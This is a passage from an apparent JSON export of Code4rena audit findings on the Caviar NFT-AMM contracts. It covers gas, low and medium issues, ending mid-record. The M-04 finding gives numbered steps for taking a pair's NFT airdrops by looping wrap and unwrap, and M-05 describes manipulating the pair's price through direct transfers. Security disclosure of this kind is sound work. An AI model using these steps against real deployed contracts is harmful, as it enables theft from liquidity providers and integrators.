      "content": "\nContracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. \n\nSee more [here](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n### Proof Of Concept\n\n```solidity\nFile: .\\Projects\\caviar202212\\2022-12-caviar\\src\\Caviar.sol\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Caviar.sol\n\n```solidity\nFile: .\\Projects\\caviar202212\\2022-12-caviar\\src\\LpToken.sol\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/LpToken.sol\n\n```solidity\nFile: .\\Projects\\caviar202212\\2022-12-caviar\\src\\Pair.sol\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol\n\n### Recommended Mitigation Steps\nFind a lower method ID name for the most called functions for example `Call()` vs. `Call1()` is cheaper by 22 gas.<br>\nFor example, the function IDs in the Gauge.sol contract will be the most used; A lower method ID may be given.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-06-optimize-names-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6113",
      "title": "[G-05] Public Functions To External",
      "impact": "GAS",
      "content": "\nThe following functions could be set external to save gas and improve code quality.<br>\nExternal call cost is less expensive than of public functions.\n\n### Proof Of Concept\n\n```solidity\nfunction create(address nft, address baseToken, bytes32 merkleRoot) public returns (Pair pair) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Caviar.sol#L28\n\n```solidity\nfunction destroy(address nft, address baseToken, bytes32 merkleRoot) public {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Caviar.sol#L49\n\n```solidity\nfunction mint(address to, uint256 amount) public onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/LpToken.sol#L19\n\n```solidity\nfunction burn(address from, uint256 amount) public onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/LpToken.sol#L26\n\n```solidity\nfunction buy(uint256 outputAmount, uint256 maxInputAmount) public payable returns (uint256 inputAmount) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L147\n\n```solidity\nfunction sell(uint256 inputAmount, uint256 minOutputAmount) public returns (uint256 outputAmount) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L182\n\n```solidity\nfunction unwrap(uint256[] calldata tokenIds) public returns (uint256 fractionalTokenAmount) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L248\n\n```solidity\nfunction nftAdd(\n        uint256 baseTokenAmount,\n        uint256[] calldata tokenIds,\n        uint256 minLpTokenAmount,\n        bytes32[][] calldata proofs\n    ) public payable returns (uint256 lpTokenAmount) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L275\n\n```solidity\nfunction nftBuy(uint256[] calldata tokenIds, uint256 maxInputAmount) public payable returns (uint256 inputAmount) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L310\n\n```solidity\nfunction close() public {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L341\n\n```solidity\nfunction withdraw(uint256 tokenId) public {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L359\n\n```solidity\nfunction baseTokenReserves() public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L379\n\n```solidity\nfunction fractionalTokenReserves() public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L383\n\n```solidity\nfunction price() public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L390\n\n```solidity\nfunction buyQuote(uint256 outputAmount) public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L398\n\n```solidity\nfunction sellQuote(uint256 inputAmount) public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L406\n\n```solidity\nfunction addQuote(uint256 baseTokenAmount, uint256 fractionalTokenAmount) public view returns (uint256) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L417\n\n```solidity\nfunction removeQuote(uint256 lpTokenAmount) public view returns (uint256, uint256) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L435\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-05-public-functions-to-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "6112",
      "title": "[G-04] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nInstead of using operator `&&` on a single `require`. Using a two `require` can save more gas.\n\ni.e.\nfor `require(version == 1 && _bytecodeHash[1] == bytes1(0), \"zf\");` use:\n\n```\n\trequire(version == 1);\n\trequire(_bytecodeHash[1] == bytes1(0));\n```\n\n### Proof Of Concept\n\n```solidity\n71: require(baseTokenAmount > 0 && fractionalTokenAmount > 0, \"Input token amount is zero\");\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L71\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-04-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6111",
      "title": "[G-03] `require()`/`revert()` Strings Longer Than 32 Bytes Cost Extra Gas",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n51: require(msg.sender == pairs[nft][baseToken][merkleRoot], \"Only pair can destroy itself\");\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Caviar.sol#L51\n\n```solidity\n80: require(lpTokenAmount >= minLpTokenAmount, \"Slippage: lp token amount out\");\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L80\n\n```solidity\n117: require(baseTokenOutputAmount >= minBaseTokenOutputAmount, \"Slippage: base token amount out\");\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L117\n\n```solidity\n120: require(fractionalTokenOutputAmount >= minFractionalTokenOutputAmount, \"Slippage: fractional token out\");\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L120\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-03-requirerevert-strings-longer-than-32-bytes-cost-extra-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6110",
      "title": "[G-02] `++i`/`i++` Should Be `unchecked{++i}`/`unchecked{i++}` When It Is Not Possible For Them To Overflow, As Is The Case When Used In For- And While-loops",
      "impact": "GAS",
      "content": "\nThe unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas PER LOOP\n\n### Proof Of Concept\n\n```solidity\n238: for (uint256 i = 0; i < tokenIds.length; i++) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L238\n\n```solidity\n258: for (uint256 i = 0; i < tokenIds.length; i++) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L258\n\n```solidity\n468: for (uint256 i = 0; i < tokenIds.length; i++) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L468\n\n```solidity\n13: for (uint256 j = 0; j < 32; j++) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/lib\\SafeERC20Namer.sol#L13\n\n```solidity\n22: for (uint256 j = 0; j < charCount; j++) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/lib\\SafeERC20Namer.sol#L22\n\n```solidity\n33: for (uint256 i = 32; i < 64; i++) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/lib\\SafeERC20Namer.sol#L33\n\n```solidity\n39: for (uint256 i = 0; i < charCount; i++) {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/lib\\SafeERC20Namer.sol#L39\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-02-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "6109",
      "title": "[G-01] `<x> += <y>` Costs More Gas Than `<x> = <x> + <y>` For State Variables",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n448: balanceOf[from] -= amount;\n453: balanceOf[to] += amount;\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L448\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L453\n\n```solidity\n35: charCount += uint8(b[i]);\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/lib\\SafeERC20Namer.sol#L35\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-01-x--y-costs-more-gas-than-x--x--y-for-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "6108",
      "title": "[L-05] Should an airdrop token arrive on the `pair.sol` contract, it will be stuck",
      "impact": "LOW",
      "content": "\nWith the `wrap()` function, NFTs are transferred to the contract and in case of airdrop due to these NFTs, it will be stuck in the contract as there is no function to take these airdrop tokens from the contract.\n\nImportant NFT project owners are given airdrops, especially since the project includes NFTs such as BAYC, Moonbirds, Doodles, Azuki, there is a high probability of receiving Airdrops, but there is no function to withdraw incoming airdrop tokens, so airdrop tokens will be stuck in the contract.\n\nA common method for airdrops is to collect airdrops with `claim`, so the `Pair.sol` contract can be considered upgradagable, adding a function to make `claim`.\n\n```solidity\nsrc/Pair.sol:\n  216      /// @return fractionalTokenAmount The amount of fractional tokens minted.\n  217:     function wrap(uint256[] calldata tokenIds, bytes32[][] calldata proofs)\n  218:         public\n  219:         returns (uint256 fractionalTokenAmount)\n  220:     {\n  221:         // *** Checks *** //\n  222: \n  223:         // check that wrapping is not closed\n  224:         require(closeTimestamp == 0, \"Wrap: closed\");\n  225: \n  226:         // check the tokens exist in the merkle root\n  227:         _validateTokenIds(tokenIds, proofs);\n  228: \n  229:         // *** Effects *** //\n  230: \n  231:         // mint fractional tokens to sender\n  232:         fractionalTokenAmount = tokenIds.length * ONE;\n  233:         _mint(msg.sender, fractionalTokenAmount);\n  234: \n  235:         // *** Interactions *** //\n  236: \n  237:         // transfer nfts from sender\n  238:         for (uint256 i = 0; i < tokenIds.length; i++) {\n  239:             ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n  240:         }\n  241: \n  242:         emit Wrap(tokenIds);\n  243:     }\n\n```\n\n### Recommended Mitigation Steps\n\nAdd this code:\n\n```solidity\n /**\n  * @notice Sends ERC20 tokens trapped in contract to external address\n  * @dev Onlyowner is allowed to make this function call\n  * @param account is the receiving address\n  * @param externalToken is the token being sent\n  * @param amount is the quantity being sent\n  * @return boolean value indicating whether the operation succeeded.\n  *\n */\n  function rescueERC20(address account, address externalToken, uint256 amount) public onlyOwner returns (bool) {\n    IERC20(externalToken).transfer(account, amount);\n    return true;\n  }\n}\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#l-05-should-an-airdrop-token-arrive-on-the-pairsol-contract-it-will-be-stuck",
      "tags": [],
      "finders": []
    },
    {
      "id": "6107",
      "title": "[L-04] Solmate's `SafeTransferLib` doesn't check whether the ERC20 contract exists",
      "impact": "LOW",
      "content": "\nSolmate's SafeTransferLib, which is often used to interact with non-compliant/unsafe ERC20 tokens, does not check whether the ERC20 contract exists. The following code will not revert in case the token doesn't exist (yet).\n\nThis is stated in the Solmate library:\nhttps://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9\n\n```solidity\n\n10 results - 1 file\n\nsrc/Pair.sol:\n   94              // transfer base tokens in\n   95:             ERC20(baseToken).safeTransferFrom(msg.sender, address(this), baseTokenAmount);\n   96          }\n\n  133              // if base token is native ETH then send ether to sender\n  134:             msg.sender.safeTransferETH(baseTokenOutputAmount);\n  135          } else {\n  136              // transfer base tokens to sender\n  137:             ERC20(baseToken).safeTransfer(msg.sender, baseTokenOutputAmount);\n  138          }\n\n  168              uint256 refundAmount = maxInputAmount - inputAmount;\n  169:             if (refundAmount > 0) msg.sender.safeTransferETH(refundAmount);\n  170          } else {\n  171              // transfer base tokens in\n  172:             ERC20(baseToken).safeTransferFrom(msg.sender, address(this), inputAmount);\n  173          }\n\n  199              // transfer ether out\n  200:             msg.sender.safeTransferETH(outputAmount);\n  201          } else {\n  202              // transfer base tokens out\n  203:             ERC20(baseToken).safeTransfer(msg.sender, outputAmount);\n  204          }\n\n  238          for (uint256 i = 0; i < tokenIds.length; i++) {\n  239:             ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n  240          }\n\n  258          for (uint256 i = 0; i < tokenIds.length; i++) {\n  259:             ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n  260          }\n\n  369          // transfer the nft to the caviar owner\n  370:         ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenId);\n  371 \n```\n\n### Recommended Mitigation Steps\n\nAdd a contract exist control in functions;\n```js\npragma solidity >=0.8.0;\n\nfunction isContract(address _addr) private returns (bool isContract) {\n    isContract = _addr.code.length > 0;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#l-04-solmates-safetransferlib-doesnt-check-whether-the-erc20-contract-exists",
      "tags": [],
      "finders": []
    },
    {
      "id": "6106",
      "title": "[L-03] Loss of precision due to rounding",
      "impact": "LOW",
      "content": "\nAdd scalars so roundings are negligible\n\n```solidity\n\nsrc/Pair.sol:\n  390:     function price() public view returns (uint256) {\n  391:         return (_baseTokenReserves() * ONE) / fractionalTokenReserves();\n  392:     }\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#l-03-loss-of-precision-due-to-rounding",
      "tags": [],
      "finders": []
    },
    {
      "id": "6105",
      "title": "[L-02] Use `safeTransferOwnership` instead of `transferOwnership` function",
      "impact": "LOW",
      "content": "\n**Context:**\n```solidity\n2 results - 2 files\n\nsrc/Caviar.sol:\n   4: import \"solmate/auth/Owned.sol\";\n  12: contract Caviar is Owned {\n\n\nsrc/LpToken.sol:\n   4: import \"solmate/auth/Owned.sol\";\n  11: contract LpToken is Owned, ERC20 {\n\n```\n\n**Description:**<br>\n`transferOwnership` function is used to change Ownership from `Owned.sol`.\n\nUse a 2 structure transferOwnership which is safer.<br>\n`safeTransferOwnership`,  use it is more secure due to 2-stage ownership transfer.\n\n**Recommendation:**<br>\nUse `Ownable2Step.sol`<br>\n[Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#l-02-use-safetransferownership-instead-of-transferownership-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6104",
      "title": "[L-01] Missing ReEntrancy Guard to `withdraw` function",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-caviar/blob/main/src/Pair.sol#L359-L373\n\n### Impact\n\nPosition.sol contract has no Re-Entrancy protection in `withdraw` function\n\n```solidity\nsrc/Pair.sol:\n\n function withdraw(uint256 tokenId) public {\n        // check that the sender is the caviar owner\n        require(caviar.owner() == msg.sender, \"Withdraw: not owner\");\n\n        // check that the close period has been set\n        require(closeTimestamp != 0, \"Withdraw not initiated\");\n\n        // check that the close grace period has passed\n        require(block.timestamp >= closeTimestamp, \"Not withdrawable yet\");\n\n        // transfer the nft to the caviar owner\n        ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenId);\n\n        emit Withdraw(tokenId);\n    }\n\n```\n\nIf the mint was initiated by a contract, then the contract is checked for its ability to receive ERC721 tokens. Without reentrancy guard, onERC721Received will allow an attacker controlled contract to call the mint again, which may not be desirable to some parties, like allowing minting more than allowed.<br>\nhttps://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code\n\n### Proof of Concept\nIf `withdraw` is msg.sender contract, it can do re-entrancy by overriding `onERC721Received` function, it doesn't seem to be a serious problem since it conforms to check-effect-interaction pattern, but this is a clear re-entry due to access to other functions and pre-emit processing. is the entracy\n\n```solidity\nreentrancy.sol:\n function onERC721Received(\n    address,\n    address,\n    uint256,\n    bytes memory\n  ) public virtual override returns (bytes4) {\n    //...do something\n    }\n    return this.onERC721Received.selector;\n  }\n\n```\n\n### Recommended Mitigation Steps\nUse Openzeppelin or Solmate Re-Entrancy pattern.<br>\nHere is a example of a re-entrancy guard\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#l-01-missing-reentrancy-guard-to-withdraw-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6103",
      "title": "[M-05] Pair price may be manipulated by direct transfers",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L391> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L479-L480> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L384>\n\nAn attacker may manipulate the price of a pair by transferring tokens directly to the pair. Since the `Pair` contract exposes the `price` function, it maybe be used as a price oracle in third-party integrations. Manipulating the price of a pair may allow an attacker to steal funds from such integrations.\n\n### Proof of Concept\n\nThe `Pair` contract is a pool of two tokens, a base token and a fractional token. Its main purpose is to allow users to swap the tokens at a fair price. Since the price is calculated based on the reserves of a pair, it can only be changed in two cases:\n\n1.  when initial liquidity is added: the first liquidity provider sets the price of a pool ([Pair.sol#L85-L97](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L85-L97)); other liquidity providers cannot change the price ([Pair.sol#L421-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L421-L423));\n2.  during trades: trading adds and removes tokens from a pool, ensuring the K constant invariant is respected ([Pair.sol#L194-L204](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L194-L204), [Pair.sol#L161-L173](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L161-L173)).\n\nHowever, the Pair contract calculates the price using the current token balances of the contract ([Pair.sol#L379-L385](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L379-L385), [Pair.sol#L477-L481](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L477-L481)):\n\n```solidity\nfunction baseTokenReserves() public view returns (uint256) {\n    return _baseTokenReserves();\n}\n\nfunction _baseTokenReserves() internal view returns (uint256) {\n    return baseToken == address(0)\n        ? address(this).balance - msg.value // subtract the msg.value if the base token is ETH\n        : ERC20(baseToken).balanceOf(address(this));\n}\n\nfunction fractionalTokenReserves() public view returns (uint256) {\n    return balanceOf[address(this)];\n}\n```\n\nThis allows an attacker to change the price of a pool and skip the K constant invariant check that's enforced on new liquidity ([Pair.sol#L421-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L421-L423)).\n\n### Recommended Mitigation Steps\n\nConsider tracking pair's reserves internally, using state variables, similarly to how Uniswap V2 does that:\n\n*   [UniswapV2Pair.sol#L22-L23](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L22-L23):\n\n```solidity\nuint112 private reserve0;           // uses single storage slot, accessible via getReserves\nuint112 private reserve1;           // uses single storage slot, accessible via getReserves\n```\n\n*   [UniswapV2Pair.sol#L38-L42](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L38-L42):\n\n```solidity\nfunction getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n    _reserve0 = reserve0;\n    _reserve1 = reserve1;\n    _blockTimestampLast = blockTimestampLast;\n}\n```\n\n*   [UniswapV2Pair.sol#L38-L42](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L38-L42):\n\n```solidity\n// update reserves and, on the first call per block, price accumulators\nfunction _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {\n    require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');\n    uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n        // * never overflows, and + overflow is desired\n        price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n        price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n    }\n    reserve0 = uint112(balance0);\n    reserve1 = uint112(balance1);\n    blockTimestampLast = blockTimestamp;\n    emit Sync(reserve0, reserve1);\n}\n```\n\n**[minhquanym (warden) commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/383#issuecomment-1385868751):**\n > @berndartmueller - The recommendation suggested that it should follow Uniswap V2 and add internal state balance. However, Uniswap V2 also has function `sync()` allowing to sync `reserve0` and `reserve1` to current token balance of contract. It means if this is an issue, it will also be an issue after UniV2 (by direct transfers and call `sync()` immediately). Please correct me if I missed something here\n> https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L198  \n\n**[berndartmueller (judge) commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/383#issuecomment-1396635210):**\n > @minhquanym - The specific issue demonstrated in this submission is exposing the `Pair.price` function, which is easily manipulatable by direct transfers and thus vulnerable as a price oracle. Uniswap V2, in comparison, uses the concept of a cumulative price weighted by the amount of time this price existed (see https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles for more details).\n\n**[outdoteth (Caviar) acknowledged](https://github.com/code-423n4/2022-12-caviar-findings/issues/383#event-8321057436)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the 'Pair' contract which is a pool of two tokens, a base token and a fractional token. This contract is used to allow users to swap tokens at a fair price. The vulnerability allows an attacker to manipulate the price of a pair by transferring tokens directly to the pair, which may allow them to steal funds from third-party integrations. The vulnerability is caused by the fact that the 'Pair' contract calculates the price using the current token balances of the contract, which allows the attacker to bypass the K constant invariant check that is enforced on new liquidity.\n\nThe recommended mitigation steps for this vulnerability are to consider tracking pair's reserves internally, using state variables, similarly to how Uniswap V2 does that. This would involve creating two private state variables, `reserve0` and `reserve1`, and a function `getReserves` which returns the two variables and the `blockTimestampLast`. Another function, `_update`, would be used to update the reserves and, on the first call per block, the price accumulators. This would ensure that the price of the pair is accurately calculated and that the K constant invariant is respected.",
      "quality_score": 5,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/383",
      "tags": [
        "Lending Pool"
      ],
      "finders": [
        "dic0de",
        "Janio",
        "UNCHAIN",
        "BPZ",
        "Jeiwan",
        "ladboy233",
        "hansfriese",
        "ak1"
      ]
    },
    {
      "id": "6102",
      "title": "[M-04] It's possible to swap NFT token ids without fee and also attacker can wrap unwrap all the NFT token balance of the Pair contract and steal their air drops for those token ids",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L217-L243> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L248-L262>\n\nUsers can `wrap()` their NFT tokens (which id is whitelisted) and receive `1e18` fractional token or they can pay `1e18` fractional token and unwrap NFT token. there is two issue here:\n\n1.  anyone can swap their NFT token id with another NFT token id without paying any fee(both ids should be whitelisted). it's swap without fee.\n2.  attacker can swap his NFT token(with whitelisted id) for all the NFT balance of contract and steal those NFT tokens airdrop all in one transaction.\n\n### Proof of Concept\n\nThis is `wrap()` and `unwrap()` code:\n\n        function wrap(uint256[] calldata tokenIds, bytes32[][] calldata proofs)\n            public\n            returns (uint256 fractionalTokenAmount)\n        {\n            // *** Checks *** //\n\n            // check that wrapping is not closed\n            require(closeTimestamp == 0, \"Wrap: closed\");\n\n            // check the tokens exist in the merkle root\n            _validateTokenIds(tokenIds, proofs);\n\n            // *** Effects *** //\n\n            // mint fractional tokens to sender\n            fractionalTokenAmount = tokenIds.length * ONE;\n            _mint(msg.sender, fractionalTokenAmount);\n\n            // *** Interactions *** //\n\n            // transfer nfts from sender\n            for (uint256 i = 0; i < tokenIds.length; i++) {\n                ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n            }\n\n            emit Wrap(tokenIds);\n        }\n\n        function unwrap(uint256[] calldata tokenIds) public returns (uint256 fractionalTokenAmount) {\n            // *** Effects *** //\n\n            // burn fractional tokens from sender\n            fractionalTokenAmount = tokenIds.length * ONE;\n            _burn(msg.sender, fractionalTokenAmount);\n\n            // *** Interactions *** //\n\n            // transfer nfts to sender\n            for (uint256 i = 0; i < tokenIds.length; i++) {\n                ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n            }\n\n            emit Unwrap(tokenIds);\n        }\n\nAs you can see it's possible to wrap one NFT token (which id is whitelisted and is in merkle tree) and unwrap another NFT token without paying fee. so Pair contract create NFT swap without fee for users but there is no fee generated for those who wrapped and put their fractional tokens as liquidity providers.\nThe other issue with this is that some NFT tokens air drop new NFT tokens for NFT holders by making NFT holders to call `getAirdrop()` function. attacker can use this swap functionality to get air drop token for all the NFT balance of the Pair contract. to steps to perform this attack:\n\n1.  if Pair contract is for NFT1 and baseToken1 and also merkle tree root hash is 0x0.\n2.  users deposited 100 NFT1 tokens to the Pair contract.\n3.  NFT1 decide to airdrop some new tokens for token holders and token holders need to call `nft.getAirDrop(id)` while they own the NFT id.\n4.  attacker would create a contract and buy one of the NFT1 tokens (attackerID1) and wrap it to receive `1e18` fractional tokens and perform this steps in the contract:<br>\n    4.1 loop through all the NFT tokens in the Pair contract balance and:<br>\n    4.2 unwrap NFT token id=i from Pair contract by paying `1e18` fractional token.<br>\n    4.3 call `nft.getAirDrop(i)` and receive the new airdrop token. (the name of the function can be other thing not exactly `getAirDrop()`)<br>\n    4.4 wrap NFT token id=i and receive `1e18` fractional token.\n\n5. in the end attacker would unwrap attackerID1 token from Pair contract.<br>\nso attacker was able to receive all the air drops of the NFT tokens that were in the contract address, there could be 100 or 1000 NFT tokens in the contract address and attacker can steal their air drops in one transaction(by writing a contract). those air drops belongs to all the fractional owners and contract shouldn't allow one user to take all the air drops for himself. as airdrops are common in NFT collections so this bug is critical and would happen.\n\nalso some of the NFT tokens allows users to stake some tokens for their NFT tokens and receive rewards(for example BAYC/MAYC). if a user stakes tokens for his NFT tokens then wrap those NFT tokens then it would be possible for attacker to unwrap those tokens and steal user staked amounts. in this scenario user made a risky move and wrapped NFT tokens while they have stake but as a lot of users wants to stake for their NFTs this would make them unable to use caviar protocol.\n\nalso any other action that attacker can perform by becoming the 